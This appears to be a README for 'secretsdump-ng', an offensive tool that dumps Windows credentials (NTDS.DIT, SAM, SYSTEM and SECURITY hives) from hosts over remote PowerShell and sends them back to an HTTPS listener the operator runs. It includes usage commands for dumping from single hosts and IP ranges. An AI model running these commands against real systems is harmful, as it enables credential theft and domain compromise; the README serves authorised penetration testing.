# secretsdump-ng

Credential dumping tool that uses DSInternals for extracting credentials from Windows systems, using any available command-execution port (rather than relying on 445).

Massive props to DSInternals & Impacket; this tool really isn't anything revolutionary and uses the impressive work already completed by Michael Grafnetter and the Fortra team.

## Features

- NTDS.DIT extraction using DSInternals on Domain Controllers
- Registry hive dumping (SAM, SYSTEM, SECURITY) on Windows Servers
- Multi-threaded operations for dumping from multiple hosts
- Secure transfer of credentials via HTTPS
- Filtered extraction - dump only specific users with `--just-dc-user`

## Usage

```bash
# Dump all credentials from a single host
secretsdump-ng 192.168.1.10 username password

# Dump from multiple hosts using IP range
secretsdump-ng 192.168.1.10-20 username password

# Dump only a specific user
secretsdump-ng 192.168.1.10 username password --just-dc-user administrator

# Use more threads for faster scanning
secretsdump-ng 192.168.1.1-254 username password --threads 20

# Verbose output
secretsdump-ng 192.168.1.10 username password -v
```

## How It Works

1. **Sets up HTTPS server** on port 1338 to receive credential dumps
2. **Executes PowerShell remotely** on target systems using `AuthFinder`
3. **Extracts registry hives** (SAM, SYSTEM, SECURITY) from all Windows systems
4. **Extracts NTDS.DIT** using DSInternals on Domain Controllers
5. **Processes and formats** credentials using impacket-secretsdump
6. **Saves output** to `./secretsdump_ng_out/[IP]/secretsdump.out`


Admin accounts are highlighted with `(admin)` tag. Machine accounts are sorted to the bottom.

## Security Notes

- Uses temporary SSL certificates for HTTPS transfers
- Temporary files on target systems are stored in `$env:TEMP` and cleaned up after extraction
